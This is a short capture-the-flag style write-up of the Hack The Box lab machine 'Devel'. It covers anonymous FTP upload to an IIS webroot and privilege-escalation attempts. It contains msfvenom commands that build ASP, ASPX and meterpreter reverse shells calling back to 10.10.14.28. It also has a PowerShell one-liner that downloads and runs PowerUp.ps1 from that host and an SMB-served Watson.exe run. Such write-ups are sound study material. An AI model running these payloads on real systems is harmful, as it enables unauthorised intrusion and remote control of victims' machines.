# Devel 10.10.10.5
## ftp and iis running on this windows machine
### based on the content of the ftp I believe that it is the webserver itself. 
- POC --> upload a html, htm, txt file and see if I can view it

## POC is successfull and the file exists on the server
### Create msfvenom payload in the form of an asp shell and upload
- If all else fails upload a web command shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=1985 -f asp > shell.asp
``` 

- The asp shell threw a 500 error.
	- Change the port to 443 that we are listening on and make it aspx

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f aspx > shell.aspx
``` 
### aspx shell works and now have a low privlage shell on the box

# Enumeration
## Attempt to download and run PowerUp.ps1 on the machine using ippsec's command from bastard
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.28:8001/PowerUp.ps1') | powershell -noprofile -
```
- While a useful command, it was not fruitful in producing output

### I attempted to compile and install Watson, but was also not fruitful 
```
sudo python3 smbserver.py exploit .
```

```
net use \\10.10.14.28\exploit

\\10.10.14.28\exploit\Watson.exe
```
- It simply was not supported for the build because I used a windows 10 machines to build the project. Good to hold on to though
- Will continue following through with a writeup testing one of the many other kernal exploits
- We know the build and the date that windows 7 came out
- Does not appear to be updated or contain any service packs
- look for a POC and exploit

- https://0xdf.gitlab.io/2019/03/05/htb-devel.html

## Instead we're gonna go the meterpreter route
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=443 -f aspx > meter_shell.aspx

```

- follow through with the write up and thats all!
	- Meterpreter is powerful
